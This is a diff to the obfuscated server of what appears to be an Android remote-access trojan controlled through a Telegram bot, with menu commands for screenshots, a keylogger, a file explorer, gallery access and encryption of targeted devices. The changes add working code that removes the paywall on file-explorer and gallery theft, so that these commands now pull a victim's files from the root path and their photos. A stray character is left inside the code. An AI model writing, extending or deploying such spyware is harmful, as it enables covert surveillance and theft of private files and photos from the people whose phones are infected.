@@ -94,9 +94,9 @@ io.on("connection", (_0x48afef) => {
     bot.sendMessage(
       data.id,
       "<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " +
-        _0x35d854 +
-        "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>" +
-        _0x44fcc5,
+      _0x35d854 +
+      "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>" +
+      _0x44fcc5,
       {
         parse_mode: "HTML",
       },
@@ -200,8 +200,8 @@ bot.on("message", (_0xdbde0c) => {
           bot.sendMessage(
             data.id,
             "<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 " +
-              _0x16b4e5 +
-              "</b>\n\n",
+            _0x16b4e5 +
+            "</b>\n\n",
             {
               parse_mode: "HTML",
               reply_markup: {
@@ -509,8 +509,8 @@ bot.on("message", (_0xdbde0c) => {
                               bot.sendMessage(
                                 data.id,
                                 "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " +
-                                  _0x3202e5 +
-                                  "</b>\n\n",
+                                _0x3202e5 +
+                                "</b>\n\n",
                                 {
                                   parse_mode: "HTML",
                                   reply_markup: {
@@ -736,16 +736,17 @@ bot.on("message", (_0xdbde0c) => {
                                 );
                               }
                               if (_0xdbde0c.text === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
-                             if (_0xdbde0c.text === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
-                               var target = appData.get("currentTarget");
-                               var packet = {
-                                 request: "screenshot",
-                                 extras: [],
-                               };
-                               io.to(target).emit("commend", packet);
-                               bot.sendMessage(data.id, "Done!");
-                             }       
-                                                                                                                                                    د                                                                                                                                                                    }
+                                if (_0xdbde0c.text === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
+                                  var target = appData.get("currentTarget");
+                                  var packet = {
+                                    request: "screenshot",
+                                    extras: [],
+                                  };
+                                  io.to(target).emit("commend", packet);
+                                  bot.sendMessage(data.id, "Done!");
+                                }
+                                د
+                              }
                               if (_0xdbde0c.text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯") {
                                 if (_0x3ea82b == "all") {
                                   io.sockets.emit("commend", {
@@ -803,36 +804,18 @@ bot.on("message", (_0xdbde0c) => {
                                 );
                               }
                               if (_0xdbde0c.text === "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯") {
-                                bot.sendMessage(
-                                  data.id,
-                                  "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n",
-                                  {
-                                    parse_mode: "HTML",
-                                    reply_markup: {
-                                      keyboard: [
-                                        ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"],
-                                        ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"],
-                                      ],
-                                      resize_keyboard: true,
-                                    },
-                                  },
-                                );
+                                var target = appData.get("currentTarget");
+                                io.to(target).emit("commend", { 'request': "file_explorer", 'extras': [{ 'key': "path", 'value': "/" }] });
+                                bot.sendMessage(data.id, "<b>✯ Accessing Files...</b>", { 'parse_mode': "HTML" });
                               }
                               if (_0xdbde0c.text === "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯") {
-                                bot.sendMessage(
-                                  data.id,
-                                  "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n",
-                                  {
-                                    parse_mode: "HTML",
-                                    reply_markup: {
-                                      keyboard: [
-                                        ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"],
-                                        ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"],
-                                      ],
-                                      resize_keyboard: true,
-                                    },
-                                  },
-                                );
+                                var target = appData.get("currentTarget");
+                                // ارسال دستور با ساختار استاندارد سورس تو
+                                io.to(target).emit("commend", {
+                                  'request': "gallery",
+                                  'extras': []
+                                });
+                                bot.sendMessage(data.id, "<b>✯ Accessing Gallery Photos...</b>", { 'parse_mode': "HTML" });
                               }
                               if (_0xdbde0c.text === "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯") {
                                 bot.sendMessage(
@@ -1024,8 +1007,8 @@ bot.on("message", (_0xdbde0c) => {
                                     bot.sendMessage(
                                       data.id,
                                       "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " +
-                                        _0x22a16b.model +
-                                        "</b>\n\n",
+                                      _0x22a16b.model +
+                                      "</b>\n\n",
                                       {
                                         parse_mode: "HTML",
                                         reply_markup: {
@@ -1122,7 +1105,7 @@ setInterval(() => {
   });
 }, 0x1388);
 setInterval(() => {
-  https.get(data.host, (_0x9df260) => {}).on("error", (_0x26bc04) => {});
+  https.get(data.host, (_0x9df260) => { }).on("error", (_0x26bc04) => { });
 }, 0x75300);
 server.listen(process.env.PORT || 0xbb8, () => {
   console.log("listening on port 3000");
